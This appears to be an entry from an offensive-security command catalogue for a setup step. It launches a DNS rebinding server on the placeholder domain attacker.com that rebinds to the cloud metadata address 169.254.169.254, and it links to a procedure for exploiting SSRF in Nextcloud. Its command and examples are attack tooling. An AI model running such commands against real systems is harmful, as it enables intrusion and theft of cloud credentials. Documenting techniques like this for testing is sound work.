---
data: >-
  python dns_rebind_server.py --domain attacker.com --bind-ip 127.0.0.1
  --target-ip 169.254.169.254 --port 80
tags:
  - dns
  - rebinding
  - setup
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:53:38.629Z'
id: c9bec5f0-3fc1-4304-91e5-279c4b41edc9
verified: false
validated: true
submitted: true
---
# setup-dns-rebinding

## Command

```bash
python dns_rebind_server.py --domain attacker.com --bind-ip 127.0.0.1 --target-ip 169.254.169.254 --port 80
```

## Description

This command launches a Python DNS rebinding server to facilitate bypassing DNS pinning by dynamically changing IP resolutions for a specified domain.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--domain` | The domain to control resolutions for | Yes |
| `--bind-ip` | Initial IP to resolve to (attacker-controlled) | Yes |
| `--target-ip` | IP to rebind to (internal target) | Yes |
| `--port` | Port for the fake server | No |

## Examples

### Basic Usage

```bash
python dns_rebind_server.py --domain attacker.com --bind-ip 127.0.0.1 --target-ip 169.254.169.254
```

### Advanced Usage

```bash
python dns_rebind_server.py --domain attacker.com --bind-ip 127.0.0.1 --target-ip 169.254.169.254 --port 80 --ttl 1
```

## Expected Output

Server startup message: "DNS Rebinding server running on port 53, domain attacker.com configured for rebinding."

## Related

- [[Related Procedure|procedures/Exploit-DNS-Rebinding-for-SSRF-in-Nextcloud]]
